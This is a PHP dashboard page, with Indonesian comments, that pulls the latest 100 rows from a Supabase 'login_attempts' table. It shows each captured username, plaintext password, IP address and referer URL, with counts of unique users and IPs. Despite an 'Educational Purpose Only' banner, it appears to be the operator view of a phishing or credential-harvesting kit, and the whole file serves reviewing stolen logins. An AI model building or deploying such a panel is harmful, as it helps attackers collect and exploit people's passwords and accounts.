<?php
// view_data.php
require_once 'config.php';

// Ambil semua data, urutkan dari yang terbaru
$endpoint = 'login_attempts?select=*&order=timestamp.desc&limit=100';
$results = supabaseRequest($endpoint, 'GET');

if (isset($results['error'])) {
    die("<h1>Error mengambil data!</h1><pre>" . print_r($results, true) . "</pre>");
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Attempts Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 30px;
            background: #f8f9fa;
        }
        
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
        }
        
        .stat-card h3 {
            color: #667eea;
            font-size: 2em;
            margin-bottom: 5px;
        }
        
        .stat-card p {
            color: #666;
            font-size: 0.9em;
        }
        
        .table-container {
            padding: 30px;
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
        }
        
        th {
            background: #667eea;
            color: white;
            padding: 15px;
            text-align: left;
            font-weight: 600;
            position: sticky;
            top: 0;
        }
        
        td {
            padding: 12px 15px;
            border-bottom: 1px solid #eee;
        }
        
        tr:hover {
            background: #f8f9fa;
        }
        
        .password {
            font-family: 'Courier New', monospace;
            background: #ffe5e5;
            padding: 5px 10px;
            border-radius: 5px;
            color: #d63031;
            font-weight: bold;
        }
        
        .username {
            font-weight: 600;
            color: #0984e3;
        }
        
        .timestamp {
            color: #636e72;
            font-size: 0.9em;
        }
        
        .ip {
            font-family: 'Courier New', monospace;
            background: #dfe6e9;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 0.85em;
        }
        
        .url {
            color: #00b894;
            font-size: 0.85em;
            word-break: break-all;
        }
        
        .refresh-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: #667eea;
            color: white;
            border: none;
            padding: 15px 25px;
            border-radius: 50px;
            font-size: 1em;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
            transition: all 0.3s;
        }
        
        .refresh-btn:hover {
            background: #764ba2;
            transform: translateY(-2px);
            box-shadow: 0 7px 20px rgba(102, 126, 234, 0.6);
        }
        
        .no-data {
            text-align: center;
            padding: 50px;
            color: #999;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Login Attempts Dashboard</h1>
            <p>Educational Purpose Only - Monitor Login Activity</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h3><?php echo count($results); ?></h3>
                <p>Total Attempts</p>
            </div>
            <div class="stat-card">
                <h3><?php echo count(array_unique(array_column($results, 'username'))); ?></h3>
                <p>Unique Users</p>
            </div>
            <div class="stat-card">
                <h3><?php echo count(array_unique(array_column($results, 'ip_address'))); ?></h3>
                <p>Unique IPs</p>
            </div>
        </div>
        
        <div class="table-container">
            <?php if (empty($results)): ?>
                <div class="no-data">
                    📭 Belum ada data login attempts
                </div>
            <?php else: ?>
                <table>
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>IP Address</th>
                            <th>Referer URL</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($results as $row): ?>
                        <tr>
                            <td class="timestamp"><?php echo date('d M Y H:i:s', strtotime($row['timestamp'])); ?></td>
                            <td><span class="username"><?php echo htmlspecialchars($row['username']); ?></span></td>
                            <td><span class="password"><?php echo htmlspecialchars($row['password']); ?></span></td>
                            <td><span class="ip"><?php echo htmlspecialchars($row['ip_address']); ?></span></td>
                            <td><span class="url"><?php echo htmlspecialchars($row['referer_url']); ?></span></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php endif; ?>
        </div>
    </div>
    
    <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
</body>
</html>
